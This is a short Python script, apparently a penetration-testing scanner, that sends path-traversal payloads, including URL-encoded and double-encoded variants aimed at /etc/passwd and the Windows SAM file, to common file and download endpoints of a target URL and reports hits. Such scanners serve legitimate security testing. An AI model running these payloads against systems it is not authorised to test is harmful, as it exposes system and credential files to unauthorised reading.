#!/usr/bin/env python3
"""
test_path_traversal.py - Directory Traversal Testing Script
Usage: python test_path_traversal.py <target_url>
"""

import sys
import requests
from urllib.parse import urljoin

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "../../../windows/system32/config/sam",
    "....\\....\\....\\windows\\system32\\config\\sam",
]

INDICATORS = ["root:", "bin:", "daemon:", "[boot loader]", "[operating systems]"]

def test_traversal(base_url):
    print(f"=== Path Traversal Test ===")
    print(f"Target: {base_url}\n")
    
    vulnerable = []
    test_endpoints = ["/api/file?path={}", "/api/download?file={}", "/static/{}"]
    
    for endpoint in test_endpoints:
        for payload in TRAVERSAL_PAYLOADS:
            url = urljoin(base_url, endpoint.format(payload))
            try:
                resp = requests.get(url, timeout=10)
                
                if any(ind in resp.text for ind in INDICATORS):
                    print(f"[!] Path traversal found: {endpoint}")
                    print(f"    Payload: {payload}")
                    vulnerable.append((endpoint, payload))
                    break
                    
            except requests.exceptions.RequestException:
                pass
    
    print(f"\n=== Results ===")
    if vulnerable:
        print(f"[CRITICAL] Found {len(vulnerable)} path traversal vulnerabilities!")
    else:
        print("[OK] No path traversal vulnerabilities detected.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    test_traversal(sys.argv[1])
